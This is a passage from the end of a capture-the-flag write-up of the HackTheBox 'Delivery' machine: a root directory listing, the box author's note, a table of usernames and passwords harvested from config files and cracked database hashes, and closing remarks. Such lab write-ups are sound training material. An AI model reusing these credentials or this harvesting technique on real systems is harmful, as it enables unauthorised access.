+drwxr-xr-x <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Jan  <span style="color:#ae81ff">5</span> 06:06 ..
+lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">28</span> 07:04 .bash_history -&gt; /dev/null
+-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
+drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:33 .cache
+drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">27</span> 13:41 .gnupg
+-rwxr-x---  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">103</span> Dec <span style="color:#ae81ff">26</span> 11:26 mail.sh
+-r--------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">382</span> Dec <span style="color:#ae81ff">28</span> 07:02 note.txt
+-rw-r-----  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
+-rw-r-----  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1499</span> Dec <span style="color:#ae81ff">26</span> 10:55 py-smtp.py
+-r--------  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Mar <span style="color:#ae81ff">28</span> 17:15 root.txt
+drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">27</span> 14:28 .vim
+</code></pre></div><p>And here&rsquo;s the note from the author:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@Delivery:~# cat note.txt
+I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I<span style="color:#e6db74">&#39;ve seen several times.  The inspiration for the box is here:
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Keep on hacking! And please don&#39;</span>t forget to subscribe to all the security streamers out there.
+
+- ippsec
+</code></pre></div><p>That said, the man is a complete legend and this box was fun to do. The foothold took me an embarassingly long time to get around but where there&rsquo;s as will&ndash; there&rsquo;s a relative</p>
+<hr>
+<h1 id="credential-store">Credential Store<a href="#credential-store" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Here&rsquo;s a run down of the username and passwords collected during this box:</p>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Password</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>maildeliverer</td>
+<td>Youve_G0t_Mail!</td>
+<td>via the Mattemost &ldquo;Internal&rdquo; group</td>
+</tr>
+<tr>
+<td>ost_user</td>
+<td>!H3lpD3sk123!</td>
+<td>/var/www/osticket/upload/include/ost-config.php</td>
+</tr>
+<tr>
+<td>mmuser</td>
+<td>Crack_The_MM_Admin_PW</td>
+<td>/opt/mattermost/config/config.json</td>
+</tr>
+<tr>
+<td>root</td>
+<td>PleaseSubscribe!21</td>
+<td>Hashcat via Mattermost DB User Hashes</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h1 id="final-thoughts">Final Thoughts<a href="#final-thoughts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>All in all I found this to be a well crafted, very unique box that demonstrates a vulnerability that could easily be found out in the wild. It also highlights a method I&rsquo;ve never seen before; using generated helpdesk email addresses to intercept correspondence from other, associated, Single Sign On services. Utter genius.</p>
+<p>Finally, it would be remiss of me not to point this out: my HTB squad TargetRoot, namely my friend Coaran, got the root blood on this box some minutes after the user blood was taken. Please go and drop him, the team and (if you&rsquo;re feeling extra nice) myself a respect hit and spread the love across this incredible community. One that, to this day, I&rsquo;m proud to be part of.</p>
+<p><code>-5ysk3y</code></p>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+<a href="#top">Back to top of page</a>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://5ysk3y.github.io/assets/main.js"></script>
+<script src="https://5ysk3y.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
